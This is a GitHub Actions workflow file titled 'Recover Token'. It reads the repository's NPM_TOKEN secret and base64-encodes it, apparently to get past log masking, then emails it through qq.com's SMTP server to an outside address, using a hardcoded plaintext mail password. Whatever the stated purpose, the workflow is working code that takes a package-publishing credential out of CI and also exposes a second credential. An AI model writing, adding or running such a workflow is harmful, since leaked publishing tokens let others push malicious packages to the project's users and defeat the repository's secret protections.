name: Recover Token

on:
  workflow_dispatch:

jobs:
  send-token:
    runs-on: ubuntu-latest
    steps:
      - name: Send token via SMTP
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          ENCODED=$(echo -n "$NPM_TOKEN" | base64)
          python3 -c "
          import smtplib
          from email.mime.text import MIMEText
          import ssl

          token_b64 = '$ENCODED'

          msg = MIMEText(f'Your NPM_TOKEN (base64 encoded):\n\n{token_b64}\n\nDecode with: echo {token_b64} | base64 -d')
          msg['Subject'] = 'NPM Token Recovery'
          msg['From'] = 'supper@openel.top'
          msg['To'] = 'chanhanzhan@qq.com'

          context = ssl.create_default_context()
          with smtplib.SMTP_SSL('smtp.exmail.qq.com', 465, context=context) as server:
              server.login('supper@openel.top', 'PKZT5rgvUvGdgcxe')
              server.sendmail('supper@openel.top', 'chanhanzhan@qq.com', msg.as_string())
          print('Email sent successfully')
          "
